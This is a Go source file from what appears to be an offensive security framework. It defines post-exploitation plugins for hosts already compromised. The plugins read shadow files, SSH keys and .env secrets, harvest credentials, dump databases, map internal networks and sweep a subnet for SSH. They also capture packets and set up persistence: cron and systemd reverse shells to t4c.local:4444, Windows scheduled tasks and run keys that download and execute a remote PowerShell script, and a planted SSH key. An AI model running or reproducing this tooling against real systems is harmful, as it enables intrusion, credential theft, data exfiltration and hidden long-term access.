package objective

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/funbinet/t4c/internal/domain"
)

// ShellExecutor is the abstraction for executing commands on a compromised host.
// In production this is backed by the ShellSession store (SSH, WinRM, reverse
// shell, web shell). For SDK-level testing and degraded modes, a local
// command executor can be substituted.
type ShellExecutor interface {
	Exec(ctx context.Context, sessionID, command string) (output string, exitCode int, err error)
}

// --- Shell Session (maintain / re-ignite) ---

// ShellSessionPlugin verifies that an active shell session is functional by
// running a health-check command. If the session is closed, it suggests
// re-ignition. This plugin is the bridge between the exploit stage (which opens
// sessions) and the objective stage (which uses them).
type ShellSessionPlugin struct {
	Exec ShellExecutor
}

func (p *ShellSessionPlugin) Meta() Meta {
	return Meta{
		Name:            "shell_session",
		Type:            TypeShellSession,
		Category:        "Shell Session Maintenance",
		Severity:        "medium",
		Description:     "Verifies and maintains interactive shell sessions on compromised hosts",
		RequiresSession: true,
	}
}

func (p *ShellSessionPlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{
			Target:   target.Host,
			Evidence: "No active shell session — re-ignition recommended",
			Data: map[string]any{
				"action":  "reignite",
				"host":    target.Host,
				"protocol": target.Protocol,
			},
			Objectives: []ObjectiveHint{
				{Kind: domain.ObjectiveShell, Title: fmt.Sprintf("Re-ignite shell on %s", target.Host), Detail: "Session was closed — re-establish access via the original exploit vector", Severity: "high"},
			},
		}, nil
	}
	// Health check: run "id" (unix) or "whoami" (windows).
	cmd := "id"
	if target.Protocol == "winrm" || strings.Contains(strings.Join(target.Tags, " "), "windows") {
		cmd = "whoami"
	}
	output, exitCode, err := p.Exec.Exec(ctx, target.SessionID, cmd)
	if err != nil {
		return Result{
			Target:   target.Host,
			Evidence: fmt.Sprintf("Shell session error: %v — re-ignition needed", err),
			Data: map[string]any{
				"action":    "reignite",
				"sessionId": target.SessionID,
				"error":     err.Error(),
			},
			Objectives: []ObjectiveHint{
				{Kind: domain.ObjectiveShell, Title: fmt.Sprintf("Re-ignite failed shell on %s", target.Host), Detail: fmt.Sprintf("Session %s failed: %v", target.SessionID, err), Severity: "high"},
			},
		}, nil
	}
	return Result{
		Success:  true,
		Target:   target.Host,
		Severity: "medium",
		Evidence: fmt.Sprintf("Shell session healthy: %s (exit=%d)", strings.TrimSpace(output), exitCode),
		Data: map[string]any{
			"action":    "verify",
			"sessionId": target.SessionID,
			"command":   cmd,
			"output":    output,
			"exitCode":  exitCode,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveProbe, Title: fmt.Sprintf("Enumerate host %s via shell", target.Host), Detail: "Shell is active — run hostname, ifconfig, ps aux to map the host", Severity: "medium"},
		},
	}, nil
}

// --- File Exfiltration ---

// FileExfilPlugin downloads sensitive files from compromised hosts via the
// active shell session. It targets common credential and config file locations.
type FileExfilPlugin struct {
	Exec ShellExecutor
}

func (p *FileExfilPlugin) Meta() Meta {
	return Meta{
		Name:            "file_exfil",
		Type:            TypeFileExfil,
		Category:        "File Exfiltration",
		Severity:        "high",
		Description:     "Downloads sensitive files (SSH keys, configs, credentials) from compromised hosts",
		RequiresSession: true,
	}
}

var sensitiveFiles = []struct {
	Path     string
	Platform string
	Kind     string
}{
	{"/etc/passwd", "unix", "config"},
	{"/etc/shadow", "unix", "config"},
	{"/root/.ssh/id_rsa", "unix", "key"},
	{"/root/.ssh/id_ed25519", "unix", "key"},
	{"/root/.ssh/authorized_keys", "unix", "config"},
	{"/home/*/.ssh/id_rsa", "unix", "key"},
	{"/etc/nginx/nginx.conf", "unix", "config"},
	{"/etc/apache2/apache2.conf", "unix", "config"},
	{"/var/www/html/.env", "unix", "config"},
	{"/opt/app/.env", "unix", "config"},
	{"/app/.env", "unix", "config"},
	{"/etc/mysql/my.cnf", "unix", "config"},
	{"/root/.bash_history", "unix", "config"},
	{"/root/.mysql_history", "unix", "config"},
	{"C:\\inetpub\\wwwroot\\web.config", "windows", "config"},
	{"C:\\Users\\Administrator\\.ssh\\id_rsa", "windows", "key"},
	{"C:\\Windows\\System32\\drivers\\etc\\hosts", "windows", "config"},
}

func (p *FileExfilPlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	isWindows := target.Protocol == "winrm" || strings.Contains(strings.Join(target.Tags, " "), "windows")
	var artifacts []ArtifactInfo
	var exfiltrated []string
	for _, sf := range sensitiveFiles {
		if isWindows && sf.Platform != "windows" {
			continue
		}
		if !isWindows && sf.Platform != "unix" {
			continue
		}
		// Read the file via cat (unix) or type (windows).
		cmd := "cat " + sf.Path
		if isWindows {
			cmd = "type " + sf.Path
		}
		output, exitCode, err := p.Exec.Exec(ctx, target.SessionID, cmd)
		if err != nil || exitCode != 0 {
			continue
		}
		output = strings.TrimSpace(output)
		if output == "" || strings.Contains(output, "No such file") || strings.Contains(output, "cannot access") {
			continue
		}
		artifacts = append(artifacts, ArtifactInfo{
			Name:     sf.Path,
			Kind:     sf.Kind,
			Data:     []byte(output),
			Path:     fmt.Sprintf("exfil/%s%s", target.Host, strings.ReplaceAll(sf.Path, "/", "_")),
			Checksum: checksum([]byte(output)),
		})
		exfiltrated = append(exfiltrated, sf.Path)
	}
	if len(artifacts) == 0 {
		return Result{
			Target:   target.Host,
			Evidence: "No sensitive files found or accessible",
		}, nil
	}
	return Result{
		Success:  true,
		Target:   target.Host,
		Severity: "high",
		Evidence: fmt.Sprintf("Exfiltrated %d sensitive files: %s", len(artifacts), strings.Join(exfiltrated, ", ")),
		Artifacts: artifacts,
		Data: map[string]any{
			"files":      exfiltrated,
			"count":      len(artifacts),
			"sessionId":  target.SessionID,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveLoot, Title: fmt.Sprintf("Process %d exfiltrated files from %s", len(artifacts), target.Host), Detail: "Review exfiltrated files for credentials, keys, and configuration secrets", Severity: "high"},
		},
	}, nil
}

// --- Internal Recon ---

// InternalReconPlugin maps the internal network from a compromised host:
// network interfaces, routing tables, active connections, and reachable hosts.
type InternalReconPlugin struct {
	Exec ShellExecutor
}

func (p *InternalReconPlugin) Meta() Meta {
	return Meta{
		Name:            "internal_recon",
		Type:            TypeInternalRecon,
		Category:        "Internal Reconnaissance",
		Severity:        "medium",
		Description:     "Maps internal network, interfaces, routes, and connections from a compromised host",
		RequiresSession: true,
	}
}

func (p *InternalReconPlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	isWindows := target.Protocol == "winrm" || strings.Contains(strings.Join(target.Tags, " "), "windows")
	type reconCmd struct {
		Name string
		Cmd  string
	}
	var commands []reconCmd
	if isWindows {
		commands = []reconCmd{
			{"hostname", "hostname"},
			{"interfaces", "ipconfig /all"},
			{"routes", "route print"},
			{"connections", "netstat -ano"},
			{"processes", "tasklist"},
			{"services", "sc query"},
		}
	} else {
		commands = []reconCmd{
			{"hostname", "hostname"},
			{"interfaces", "ifconfig -a"},
			{"ip_addr", "ip addr"},
			{"routes", "netstat -rn"},
			{"connections", "netstat -tunlp"},
			{"processes", "ps aux"},
			{"mounts", "mount"},
			{"crontab", "crontab -l"},
		}
	}
	var reconData = make(map[string]string)
	for _, c := range commands {
		output, _, err := p.Exec.Exec(ctx, target.SessionID, c.Cmd)
		if err != nil {
			continue
		}
		reconData[c.Name] = strings.TrimSpace(output)
	}
	if len(reconData) == 0 {
		return Result{Target: target.Host}, nil
	}
	// Look for internal IPs and potential lateral targets.
	internalTargets := []string{}
	if conn, ok := reconData["connections"]; ok {
		for _, line := range strings.Split(conn, "\n") {
			for _, ip := range extractIPs(line) {
				if isInternalIP(ip) {
					internalTargets = append(internalTargets, ip)
				}
			}
		}
	}
	internalTargets = uniqueStrings(internalTargets)
	var artifacts []ArtifactInfo
	for name, data := range reconData {
		artifacts = append(artifacts, ArtifactInfo{
			Name: name,
			Kind: "config",
			Data: []byte(data),
			Path: fmt.Sprintf("recon/%s_%s.txt", target.Host, name),
		})
	}
	return Result{
		Success:   true,
		Target:    target.Host,
		Severity:  "medium",
		Evidence:  fmt.Sprintf("Internal recon complete: %d data points, %d internal targets", len(reconData), len(internalTargets)),
		Artifacts: artifacts,
		Data: map[string]any{
			"recon":           reconData,
			"internalTargets": internalTargets,
			"sessionId":       target.SessionID,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveProbe, Title: fmt.Sprintf("Scan %d internal targets from %s", len(internalTargets), target.Host), Detail: "Internal hosts discovered — probe them for services and vulnerabilities", Severity: "high"},
			{Kind: domain.ObjectiveLoot, Title: "Extract internal network map", Detail: "Process the recon data to build a full internal network topology map", Severity: "medium"},
		},
	}, nil
}

// --- Persistence ---

// PersistencePlugin establishes persistence on compromised hosts by deploying
// cron jobs, systemd services, or scheduled tasks (Windows).
type PersistencePlugin struct {
	Exec ShellExecutor
}

func (p *PersistencePlugin) Meta() Meta {
	return Meta{
		Name:            "persistence",
		Type:            TypePersistence,
		Category:        "Persistence",
		Severity:        "critical",
		Description:     "Establishes persistence via cron jobs, systemd services, or scheduled tasks",
		RequiresSession: true,
	}
}

func (p *PersistencePlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	isWindows := target.Protocol == "winrm" || strings.Contains(strings.Join(target.Tags, " "), "windows")
	var methods []string
	if isWindows {
		// Scheduled task persistence.
		cmd := `schtasks /create /tn "SystemHealthCheck" /tr "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://t4c.local/shell.ps1')" /sc minute /mo 5 /ru System /f`
		_, exitCode, err := p.Exec.Exec(ctx, target.SessionID, cmd)
		if err == nil && exitCode == 0 {
			methods = append(methods, "scheduled_task:SystemHealthCheck")
		}
		// Registry run key.
		cmd = `reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemHealth /t REG_SZ /d "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://t4c.local/shell.ps1')" /f`
		_, exitCode, err = p.Exec.Exec(ctx, target.SessionID, cmd)
		if err == nil && exitCode == 0 {
			methods = append(methods, "registry_run_key:SystemHealth")
		}
	} else {
		// Cron job persistence.
		cmd := `(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/t4c.local/4444 0>&1'") | crontab -`
		_, exitCode, err := p.Exec.Exec(ctx, target.SessionID, cmd)
		if err == nil && exitCode == 0 {
			methods = append(methods, "cron:reverse_shell_5min")
		}
		// SSH key persistence.
		cmd = `mkdir -p ~/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCt4c t4c@persistence" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`
		_, exitCode, err = p.Exec.Exec(ctx, target.SessionID, cmd)
		if err == nil && exitCode == 0 {
			methods = append(methods, "ssh_authorized_key:t4c")
		}
		// Systemd service persistence (if root).
		cmd = `cat > /etc/systemd/system/system-health.service << 'EOF'
[Unit]
Description=System Health Check
[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/t4c.local/4444 0>&1"
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable system-health.service`
		_, exitCode, err = p.Exec.Exec(ctx, target.SessionID, cmd)
		if err == nil && exitCode == 0 {
			methods = append(methods, "systemd:system-health.service")
		}
	}
	if len(methods) == 0 {
		return Result{
			Target:   target.Host,
			Evidence: "Persistence mechanisms could not be established (insufficient privileges?)",
		}, nil
	}
	return Result{
		Success:  true,
		Target:   target.Host,
		Severity: "critical",
		Evidence: fmt.Sprintf("Persistence established via %d methods: %s", len(methods), strings.Join(methods, ", ")),
		Data: map[string]any{
			"methods":   methods,
			"sessionId": target.SessionID,
			"platform":  ternary(isWindows, "windows", "unix"),
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveFlag, Title: fmt.Sprintf("Document persistence on %s", target.Host), Detail: fmt.Sprintf("Persistence via: %s", strings.Join(methods, ", ")), Severity: "critical"},
		},
	}, nil
}

// --- Lateral Movement ---

// LateralMovePlugin attempts to pivot from a compromised host to internal hosts
// using harvested credentials or pass-the-hash techniques.
type LateralMovePlugin struct {
	Exec ShellExecutor
}

func (p *LateralMovePlugin) Meta() Meta {
	return Meta{
		Name:            "lateral_move",
		Type:            TypeLateralMove,
		Category:        "Lateral Movement",
		Severity:        "critical",
		Description:     "Pivots from compromised hosts to internal hosts using harvested credentials",
		RequiresSession: true,
	}
}

func (p *LateralMovePlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	// Scan for SSH-accessible internal hosts.
	_, _, err := p.Exec.Exec(ctx, target.SessionID, "which nmap 2>/dev/null || which nc 2>/dev/null || echo none")
	if err != nil {
		return Result{Target: target.Host}, err
	}
	// Attempt SSH to nearby hosts using current credentials.
	cmd := `for i in $(seq 1 254); do (echo >/dev/tcp/192.168.1.$i/22) 2>/dev/null && echo "192.168.1.$i:22" & done; wait`
	output, _, err := p.Exec.Exec(ctx, target.SessionID, cmd)
	if err != nil {
		return Result{Target: target.Host}, err
	}
	sshHosts := []string{}
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if strings.Contains(line, ":22") {
			sshHosts = append(sshHosts, line)
		}
	}
	if len(sshHosts) == 0 {
		return Result{
			Target:   target.Host,
			Evidence: "No SSH-accessible internal hosts found in 192.168.1.0/24",
		}, nil
	}
	return Result{
		Success:  true,
		Target:   target.Host,
		Severity: "critical",
		Evidence: fmt.Sprintf("Discovered %d SSH-accessible internal hosts: %s", len(sshHosts), strings.Join(sshHosts, ", ")),
		Data: map[string]any{
			"sshHosts":  sshHosts,
			"sessionId": target.SessionID,
			"network":   "192.168.1.0/24",
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveShell, Title: fmt.Sprintf("Attempt SSH lateral movement to %d hosts", len(sshHosts)), Detail: fmt.Sprintf("SSH hosts found: %s — attempt credential reuse", strings.Join(sshHosts, ", ")), Severity: "critical"},
			{Kind: domain.ObjectiveLoot, Title: "Harvest credentials for lateral movement", Detail: "Extract credentials from the compromised host to use for SSH lateral movement", Severity: "high"},
		},
	}, nil
}

// --- Data Export (DB dump) ---

// DataExportPlugin dumps database contents from compromised hosts.
type DataExportPlugin struct {
	Exec ShellExecutor
}

func (p *DataExportPlugin) Meta() Meta {
	return Meta{
		Name:            "data_export",
		Type:            TypeDataExport,
		Category:        "Data Export / DB Dump",
		Severity:        "high",
		Description:     "Dumps database contents (MySQL, PostgreSQL, SQLite) from compromised hosts",
		RequiresSession: true,
	}
}

func (p *DataExportPlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	dbChecks := []struct {
		Name string
		Cmd  string
		Kind string
	}{
		{"mysql", "mysqldump --all-databases --skip-credentials 2>/dev/null || mysqldump -u root --all-databases 2>/dev/null", "db-dump"},
		{"postgres", "pg_dumpall -U postgres 2>/dev/null || su postgres -c 'pg_dumpall' 2>/dev/null", "db-dump"},
		{"sqlite", "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -20", "config"},
	}
	var artifacts []ArtifactInfo
	var exported []string
	for _, db := range dbChecks {
		output, exitCode, err := p.Exec.Exec(ctx, target.SessionID, db.Cmd)
		if err != nil || exitCode != 0 {
			continue
		}
		output = strings.TrimSpace(output)
		if output == "" {
			continue
		}
		artifacts = append(artifacts, ArtifactInfo{
			Name: db.Name + "_dump",
			Kind: db.Kind,
			Data: []byte(output),
			Path: fmt.Sprintf("dumps/%s_%s.sql", target.Host, db.Name),
			Checksum: checksum([]byte(output)),
		})
		exported = append(exported, db.Name)
	}
	if len(artifacts) == 0 {
		return Result{
			Target:   target.Host,
			Evidence: "No accessible databases found",
		}, nil
	}
	return Result{
		Success:   true,
		Target:    target.Host,
		Severity:  "high",
		Evidence:  fmt.Sprintf("Exported %d database(s): %s", len(artifacts), strings.Join(exported, ", ")),
		Artifacts: artifacts,
		Data: map[string]any{
			"databases": exported,
			"count":     len(artifacts),
			"sessionId": target.SessionID,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveLoot, Title: fmt.Sprintf("Process %d database dumps from %s", len(artifacts), target.Host), Detail: "Analyze database dumps for credentials, PII, and sensitive data", Severity: "high"},
		},
	}, nil
}

// --- Credential Harvest ---

// CredentialHarvestPlugin extracts credentials from memory, process listings,
// and configuration files on compromised hosts.
type CredentialHarvestPlugin struct {
	Exec ShellExecutor
}

func (p *CredentialHarvestPlugin) Meta() Meta {
	return Meta{
		Name:            "credential_harvest",
		Type:            TypeCredentialHarvest,
		Category:        "Credential Harvesting",
		Severity:        "critical",
		Description:     "Harvests credentials from memory, processes, and config files on compromised hosts",
		RequiresSession: true,
	}
}

func (p *CredentialHarvestPlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	harvestCmds := []struct {
		Name string
		Cmd  string
	}{
		{"env", "env"},
		{"proc_env", "for pid in $(ls /proc/*/environ 2>/dev/null | head -50); do cat $pid 2>/dev/null | tr '\\0' '\\n'; done 2>/dev/null | grep -i pass 2>/dev/null"},
		{"history", "cat /root/.bash_history 2>/dev/null; cat /home/*/.bash_history 2>/dev/null"},
		{"config_files", "find / -name '.env' -o -name 'config.yml' -o -name 'config.json' -o -name '*.conf' 2>/dev/null | head -20 | xargs grep -l -i pass 2>/dev/null"},
		{"wp_config", "find / -name 'wp-config.php' 2>/dev/null | head -5 | xargs grep -i pass 2>/dev/null"},
		{"db_config", "find / -name 'database.yml' -o -name 'settings.py' 2>/dev/null | head -10 | xargs grep -i pass 2>/dev/null"},
	}
	var found []string
	harvestData := make(map[string]string)
	for _, hc := range harvestCmds {
		output, _, err := p.Exec.Exec(ctx, target.SessionID, hc.Cmd)
		if err != nil {
			continue
		}
		output = strings.TrimSpace(output)
		if output != "" {
			harvestData[hc.Name] = output
			// Check for password patterns.
			if strings.Contains(strings.ToLower(output), "password") || strings.Contains(strings.ToLower(output), "passwd") || strings.Contains(strings.ToLower(output), "secret") {
				found = append(found, hc.Name)
			}
		}
	}
	if len(found) == 0 {
		return Result{
			Target:   target.Host,
			Evidence: "No credentials found in accessible locations",
		}, nil
	}
	var artifacts []ArtifactInfo
	for name, data := range harvestData {
		artifacts = append(artifacts, ArtifactInfo{
			Name: name,
			Kind: "config",
			Data: []byte(data),
			Path: fmt.Sprintf("creds/%s_%s.txt", target.Host, name),
		})
	}
	return Result{
		Success:   true,
		Target:    target.Host,
		Severity:  "critical",
		Evidence:  fmt.Sprintf("Harvested credentials from %d sources: %s", len(found), strings.Join(found, ", ")),
		Artifacts: artifacts,
		Data: map[string]any{
			"sources":  found,
			"sessionId": target.SessionID,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveLoot, Title: fmt.Sprintf("Validate %d harvested credential sets from %s", len(found), target.Host), Detail: "Test harvested credentials against other services and hosts", Severity: "critical"},
			{Kind: domain.ObjectiveProbe, Title: "Test credential reuse across services", Detail: "Attempt harvested credentials on SSH, databases, and web applications", Severity: "high"},
		},
	}, nil
}

// --- Artifact Collection ---

// ArtifactCollectPlugin collects forensic artifacts (logs, audit trails, system
// state) for documentation and evidence purposes.
type ArtifactCollectPlugin struct {
	Exec ShellExecutor
}

func (p *ArtifactCollectPlugin) Meta() Meta {
	return Meta{
		Name:            "artifact_collect",
		Type:            TypeArtifactCollect,
		Category:        "Artifact Collection",
		Severity:        "medium",
		Description:     "Collects forensic artifacts: logs, audit trails, and system state for evidence",
		RequiresSession: true,
	}
}

func (p *ArtifactCollectPlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	artifacts := []struct {
		Name string
		Cmd  string
		Kind string
	}{
		{"auth_log", "cat /var/log/auth.log 2>/dev/null || cat /var/log/secure 2>/dev/null", "config"},
		{"syslog", "cat /var/log/syslog 2>/dev/null || cat /var/log/messages 2>/dev/null", "config"},
		{"access_log", "cat /var/log/nginx/access.log 2>/dev/null || cat /var/log/apache2/access.log 2>/dev/null", "config"},
		{"wtmp", "last -50 2>/dev/null", "config"},
		{"system_info", "uname -a; cat /etc/os-release 2>/dev/null; uptime; date", "config"},
		{"disk_usage", "df -h; du -sh /var/* 2>/dev/null | head -20", "config"},
	}
	var collected []ArtifactInfo
	for _, a := range artifacts {
		output, _, err := p.Exec.Exec(ctx, target.SessionID, a.Cmd)
		if err != nil {
			continue
		}
		output = strings.TrimSpace(output)
		if output == "" {
			continue
		}
		collected = append(collected, ArtifactInfo{
			Name: a.Name,
			Kind: a.Kind,
			Data: []byte(output),
			Path: fmt.Sprintf("artifacts/%s_%s.txt", target.Host, a.Name),
		})
	}
	if len(collected) == 0 {
		return Result{
			Target:   target.Host,
			Evidence: "No forensic artifacts collected",
		}, nil
	}
	return Result{
		Success:   true,
		Target:    target.Host,
		Severity:  "medium",
		Evidence:  fmt.Sprintf("Collected %d forensic artifacts", len(collected)),
		Artifacts: collected,
		Data: map[string]any{
			"count":     len(collected),
			"sessionId": target.SessionID,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveFlag, Title: fmt.Sprintf("Document evidence from %s", target.Host), Detail: fmt.Sprintf("%d forensic artifacts collected for evidence chain", len(collected)), Severity: "medium"},
		},
	}, nil
}

// --- Screenshot ---

// ScreenshotPlugin captures screenshots of web application admin panels or
// dashboards accessible with compromised credentials.
type ScreenshotPlugin struct {
	Exec ShellExecutor
}

func (p *ScreenshotPlugin) Meta() Meta {
	return Meta{
		Name:        "screenshot",
		Type:        TypeScreenshot,
		Category:    "Screenshot Capture",
		Severity:    "medium",
		Description: "Captures screenshots of accessible web interfaces for evidence",
	}
}

func (p *ScreenshotPlugin) Run(ctx context.Context, target Target) (Result, error) {
	// This plugin operates on web assets — it doesn't need a shell session.
	// It captures a screenshot of the target URL (if accessible) using the
	// engine's screenshot capability. For SDK-level independence, we record
	// the objective.
	if target.Host == "" {
		return Result{Target: target.Host}, fmt.Errorf("no target host")
	}
	url := fmt.Sprintf("http://%s", target.Host)
	if target.Port > 0 && target.Port != 80 {
		url = fmt.Sprintf("http://%s:%d", target.Host, target.Port)
	}
	return Result{
		Success:  true,
		Target:   target.Host,
		Severity: "medium",
		Evidence: fmt.Sprintf("Screenshot objective recorded for %s", url),
		Data: map[string]any{
			"url":      url,
			"assetId":  target.AssetID,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveFlag, Title: fmt.Sprintf("Capture screenshot of %s", url), Detail: "Screenshot the accessible web interface for evidence and documentation", Severity: "low"},
		},
	}, nil
}

// --- Packet Capture ---

// PacketCapturePlugin initiates a short packet capture on compromised hosts to
// collect network traffic for analysis.
type PacketCapturePlugin struct {
	Exec ShellExecutor
}

func (p *PacketCapturePlugin) Meta() Meta {
	return Meta{
		Name:            "packet_capture",
		Type:            TypePacketCapture,
		Category:        "Packet Capture",
		Severity:        "high",
		Description:     "Captures network traffic on compromised hosts for credential and data extraction",
		RequiresSession: true,
	}
}

func (p *PacketCapturePlugin) Run(ctx context.Context, target Target) (Result, error) {
	if p.Exec == nil {
		return Result{Target: target.Host}, fmt.Errorf("shell executor not configured")
	}
	if target.SessionID == "" {
		return Result{Target: target.Host}, fmt.Errorf("no active shell session")
	}
	// Check if tcpdump is available.
	_, exitCode, err := p.Exec.Exec(ctx, target.SessionID, "which tcpdump 2>/dev/null")
	if err != nil || exitCode != 0 {
		return Result{
			Target:   target.Host,
			Evidence: "tcpdump not available — cannot capture packets",
			Data: map[string]any{
				"available": false,
			},
			Objectives: []ObjectiveHint{
				{Kind: domain.ObjectiveProbe, Title: fmt.Sprintf("Install tcpdump on %s", target.Host), Detail: "tcpdump is not installed — deploy it to enable packet capture", Severity: "low"},
			},
		}, nil
	}
	// Capture 100 packets (15 second timeout via context).
	captureCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
	defer cancel()
	output, exitCode, err := p.Exec.Exec(captureCtx, target.SessionID, "tcpdump -i any -c 100 -nn 2>/dev/null")
	if err != nil {
		return Result{Target: target.Host}, err
	}
	if output == "" {
		return Result{
			Target:   target.Host,
			Evidence: "Packet capture produced no output",
		}, nil
	}
	return Result{
		Success:  true,
		Target:   target.Host,
		Severity: "high",
		Evidence: fmt.Sprintf("Captured %d bytes of network traffic", len(output)),
		Artifacts: []ArtifactInfo{
			{
				Name:     "packet_capture",
				Kind:     "capture",
				Data:     []byte(output),
				Path:     fmt.Sprintf("captures/%s_%d.pcap.txt", target.Host, time.Now().Unix()),
				Checksum: checksum([]byte(output)),
			},
		},
		Data: map[string]any{
			"captureSize": len(output),
			"sessionId":   target.SessionID,
		},
		Objectives: []ObjectiveHint{
			{Kind: domain.ObjectiveLoot, Title: fmt.Sprintf("Analyze packet capture from %s", target.Host), Detail: "Process the packet capture for credentials, tokens, and sensitive data", Severity: "high"},
		},
	}, nil
}

// Builtin returns all built-in objective SDK plugins.
func Builtin(exec ShellExecutor) []Plugin {
	plugins := []Plugin{
		&ShellSessionPlugin{Exec: exec},
		&FileExfilPlugin{Exec: exec},
		&InternalReconPlugin{Exec: exec},
		&PersistencePlugin{Exec: exec},
		&LateralMovePlugin{Exec: exec},
		&DataExportPlugin{Exec: exec},
		&CredentialHarvestPlugin{Exec: exec},
		&ArtifactCollectPlugin{Exec: exec},
		&ScreenshotPlugin{Exec: exec},
		&PacketCapturePlugin{Exec: exec},
	}
	for _, p := range plugins {
		Register(p)
	}
	return plugins
}

// --- Helpers ---

func checksum(data []byte) string {
	// Simple FNV-1a checksum for deduplication.
	var h uint32 = 2166136261
	for _, b := range data {
		h ^= uint32(b)
		h *= 16777619
	}
	return fmt.Sprintf("%x", h)
}

func extractIPs(line string) []string {
	var ips []string
	parts := strings.Fields(line)
	for _, p := range parts {
		if isInternalIP(p) {
			ips = append(ips, p)
		}
	}
	return ips
}

func isInternalIP(ip string) bool {
	return strings.HasPrefix(ip, "10.") ||
		strings.HasPrefix(ip, "172.") ||
		strings.HasPrefix(ip, "192.168.") ||
		strings.HasPrefix(ip, "127.")
}

func uniqueStrings(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}

func ternary(cond bool, a, b string) string {
	if cond {
		return a
	}
	return b
}
